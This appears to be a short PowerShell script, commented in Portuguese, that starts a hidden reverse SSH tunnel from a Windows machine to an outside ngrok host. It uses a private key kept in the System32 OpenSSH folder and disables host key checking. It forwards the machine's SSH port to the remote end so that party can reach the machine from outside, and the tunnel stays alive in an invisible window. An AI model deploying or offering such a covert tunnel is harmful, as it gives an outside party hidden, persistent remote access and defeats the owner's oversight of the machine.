# Caminho do SSH
$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"

# Caminho da chave privada
$keyPath = "C:\Windows\System32\OpenSSH\revssh_key"

# Argumentos do SSH (ignora verificação do host)
$sshArgs = "-i `"$keyPath`" -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 logosofico@0.tcp.sa.ngrok.io -p 13832 -N"

# Executa SSH em segundo plano invisível
Start-Process -FilePath $sshPath -ArgumentList $sshArgs -WindowStyle Hidden
